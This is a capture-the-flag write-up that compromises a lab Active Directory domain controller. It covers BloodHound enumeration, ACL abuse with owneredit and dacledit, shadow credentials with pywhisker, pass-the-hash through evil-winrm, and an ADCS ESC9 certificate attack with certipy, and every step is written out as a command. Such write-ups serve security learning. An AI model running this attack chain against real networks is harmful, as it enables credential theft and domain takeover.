
![[certified logo.png]]

For this box we got the following credentials

username = judith.mader
password = judith09

We first start by scanning the target

```
nmap -sVC 10.129.130.28 -oN scan.txt
```

```
<SNIP>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 22:35:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-28T22:37:11+00:00; +7h00m32s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T22:37:10+00:00; +7h00m31s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-28T22:37:11+00:00; +7h00m32s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-28T22:37:10+00:00; +7h00m31s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```


We can by the port SMB on 445, the ldap on 389 and Kerberos on 88, that we are facing an Active Directory.

From the nmap scan we see that the domain on the AD is **certified.htb** and that the name of the domain controller is **dc01.certified.htb**.

Let's add these to our /etc/hosts file

```
echo '10.129.130.28 certified.htb dc01.certified.htb' >> /etc/hosts
```


With our given credentials, we can enumerate the domain with **bloodhound**

```
bloodhound.py --zip -c all -d 'certified.htb' -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -ns 10.129.130.28
```

![Pasted image 20251029145012](Images/Pasted%20image%2020251029145012.png)

We start the neo4j service 

```
neo4j start
```

And we can launch bloodhound to import our files.

After that, we search for our user, **judith.mader** and we set her as owned

![Pasted image 20251029145615](Images/Pasted%20image%2020251029145615.png)

Then, we click on node property, and we click on **"Reachable High valuable target"**, this will tell you how we can compromise users to gain privileged access.

![Pasted image 20251029150303](Images/Pasted%20image%2020251029150303.png)

Interesting, we can see that our user has `WriteOwner ACL` on the management group and that this group has `GenericWrite ACL` on the management_svc user that is a member of this group.

That same user has CanPSRemote which means that he can use winrm to connect remotely to the machine.

Righ clicking on the line with a righ will help us understand better what we can do.

![Pasted image 20251029150739](Images/Pasted%20image%2020251029150739.png)

Ok so that means we can edit the owner of the group. Let's add judith.mader as owner of the group management.

By going on the tab, **Linux Abuse** we can see the steps to do so.

![Pasted image 20251029150955](Images/Pasted%20image%2020251029150955.png)

We simply follow the given steps.

First we change the owner of the group **management** to set us as owner with the tool **owneredit.py** from Impacket

```
owneredit.py -action write -new-owner "judith.mader" -target "Management" "certified.htb"/"judith.mader":"judith09"
```

![Pasted image 20251029151231](Images/Pasted%20image%2020251029151231.png)

It worked, now we will given the FullControl on the group by using the tool **dacledit.py** from Impacket.

```
dacledit.py -action write -rights 'FullControl' -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":"judith09"
```

![Pasted image 20251029151611](Images/Pasted%20image%2020251029151611.png)

Then we add ourself to the group

```
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"
```

Great, now that we are a member of the group, we can abuse the `GenericWrite`
on the user **management_svc**.

We will simply follow the steps by clicking the line as well and grab some info on what that permissions mean.

![Pasted image 20251029151953](Images/Pasted%20image%2020251029151953.png)

![Pasted image 20251029152013](Images/Pasted%20image%2020251029152013.png)

Let's add **shadow credentials** on the account management_svc with the tool **pywhisker.py**

```
pywhisker -v -d "certified.htb" -u "judith.mader" -p "judith09" -t 'management_svc' -a add
```
![Pasted image 20251029154809](Images/Pasted%20image%2020251029154809.png)

We got three files that will help us get the NT hashe of the user management_svc, one of them is a certificate that will allow us to get a TGT ticket with the tool **gettgtpkinit.py**.

```
gettgtpkinit.py -cert-pfx nQ5HPrgS.pfx -pfx-pass '95ac2bQbLdy3jbp09QEv' certified.htb/management_svc management.ccache
```

I got an issue with that command because in order to get a TGT ticket i had to be on the same hour as the target but by using the took **faketime** i got it to work

![Pasted image 20251029162507](Images/Pasted%20image%2020251029162507.png)

and i got the tgt ticket a file that i can export with the key `9812e60c3cfc2a836f8db77381f7fbde468ed6a0935ae00d49d5242daaaa8a8b` to retrieve the ntlm hash of the user management_svc

We need to export our file first

```
export KRB5CCNAME=management.ccache
```

And then use the tool getnthash.py to get the ntlm hash

```
getnthash.py -key 9812e60c3cfc2a836f8db77381f7fbde468ed6a0935ae00d49d5242daaaa8a8b certified.htb/management_svc 
```

![Pasted image 20251029163145](Images/Pasted%20image%2020251029163145.png)

So the hash for **management_svc** is `a091c1832bcdd4677c28b5a6a1295584`

We can use the tool evil-winrm to retrieve the user flag with the pass the hashe technique.

```
evil-winrm -u "management_svc" -H "a091c1832bcdd4677c28b5a6a1295584" -i "dc01.certified.htb"
```

![Pasted image 20251029163343](Images/Pasted%20image%2020251029163343.png)

Now we need a way to find some privesc in order to progress. Since i was not very familiar with bloodhound, i went to the tab analysis and by clicking on weak acl i got a relation between the user management_svc, which we own now, and ca_operator.

![Pasted image 20251029164427](Images/Pasted%20image%2020251029164427.png)

We see we have as the permission `Genericall`, that means that we can use the same method as before to get the hash of ca_operator

```
pywhisker -v -d "certified.htb" -u "management_svc" -H "a091c1832bcdd4677c28b5a6a1295584" -t 'ca_operator' -a add
```

```
gettgtpkinit.py -cert-pfx miRUCPLX.pfx -pfx-pass '0aX3zXnI9UFtoj1m4Et9' certified.htb/ca_operator ca_operator.ccache
```

![Pasted image 20251029210828](Images/Pasted%20image%2020251029210828.png)
![Pasted image 20251029210907](Images/Pasted%20image%2020251029210907.png)

```
export KRB5CCNAME=ca_operator.ccache
```

```
getnthash.py -key 25e260a96d09c6c08ed66e70b2aafcac170c26fcf33408ad94d42582454874c6 certified.htb/ca_operator
```
![Pasted image 20251029211144](Images/Pasted%20image%2020251029211144.png)
Good, we got the hash of that user, `b4b86f45c6018f1b664f70805f45d8f2`

Let's enumerate the target to see our capabilities

Nothing was interessing with the smb shares, so i digged into enumerate the adcs

```
nxc ldap "10.129.130.28" -u 'ca_operator' -H 'b4b86f45c6018f1b664f70805f45d8f2' -M adcs
```
![Pasted image 20251029211546](Images/Pasted%20image%2020251029211546.png)
Ok so we now know that the Certificate Service is running on the target (ADCS)

We can look for eventuals vulnerabilities with the tool **certipy**


```
certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
```

![Pasted image 20251029212050](Images/Pasted%20image%2020251029212050.png)
![Pasted image 20251029212115](Images/Pasted%20image%2020251029212115.png)

Ok we got a lot of informations there.
- the name of the certificate (certified-DC01-CA)
- the name of the template (CertifiedAuthentication)
- our permission on the certificate
- it's vulnerable to ESC9 attack

Now that we know all of that, we can try to change the UPN (User Principal Name) of our user ca_operator, to administrator.

The UPN is used to connect as a specific user instead of using his mail adress or something else. So by changing our UPN to the Administrator, we would be able to request a certificate for the user Administrator on the target.

First we modify the UPN of the user ca_operator with the user management_svc

```
certipy account update -username 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'Administrator'
```
![Pasted image 20251029212900](Images/Pasted%20image%2020251029212900.png)

Now we request a certificate to that UPN (administrator) as the user ca_operator

```
certipy req -username "ca_operator@certified.htb" -hashes "b4b86f45c6018f1b664f70805f45d8f2" -ca "certified-DC01-CA" -template "CertifiedAuthentication"
```

![Pasted image 20251029213016](Images/Pasted%20image%2020251029213016.png)

Ok, so we have the certificate for the administrator, before abusing this, we need to set the ca_operator user to his original UPN

```
certipy account update -username 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'ca_operator@certified.htb
```
![Pasted image 20251029213227](Images/Pasted%20image%2020251029213227.png)

Now that we have the certificate of the administrator and that the ca_operator his back to normal, we can authenticate on the dc with the certificate.

```
certipy auth -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.129.130.28

```
![Pasted image 20251029213503](Images/Pasted%20image%2020251029213503.png)

And finally, we got the adminitrator NTLM hash. We can login on the target using evil-winrm or psexec.py to grap the root flag

```
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

![Pasted image 20251029213733](Images/Pasted%20image%2020251029213733.png)

That concludes the challenge

